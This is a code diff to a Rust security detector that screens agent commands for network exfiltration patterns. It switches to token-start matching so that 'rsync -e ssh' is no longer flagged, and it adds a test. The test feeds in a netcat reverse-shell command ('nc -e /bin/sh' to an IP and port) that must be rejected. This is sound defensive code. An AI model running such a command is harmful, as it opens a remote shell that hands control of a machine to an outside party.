@@ -28,8 +28,13 @@ impl SecurityDetector {
         }
 
         // 2. Exfiltration Check (Dynamic)
+        // Token-start matches only: `nc -e` inside "rsync -e ssh" is not nc.
         for pattern in &patterns.exfiltration_vectors {
-            if lower_arg.contains(&pattern.to_lowercase()) {
+            let lower_pattern = pattern.to_lowercase();
+            if crate::susi_error::redact::secret_match_starts(&lower_arg, &lower_pattern)
+                .next()
+                .is_some()
+            {
                 return Err(EaiError::governance(format!(
                     "Suspicious network exfiltration pattern detected ('{}')",
                     pattern
@@ -74,6 +79,18 @@ mod tests {
     fn test_security_audit_safe_arg() {
         let ws = Path::new(".");
         assert!(SecurityDetector::audit_action("status", "cargo build", ws).is_ok());
+    }
+
+    #[test]
+    fn exfiltration_patterns_match_whole_commands_only() {
+        let ws = Path::new(".");
+        assert!(
+            SecurityDetector::audit_action("SUSI_SOLVE", "rsync -e ssh dist/ host:/srv", ws)
+                .is_ok()
+        );
+        assert!(
+            SecurityDetector::audit_action("SUSI_SOLVE", "nc -e /bin/sh 1.2.3.4 9", ws).is_err()
+        );
     }
 
     #[test]
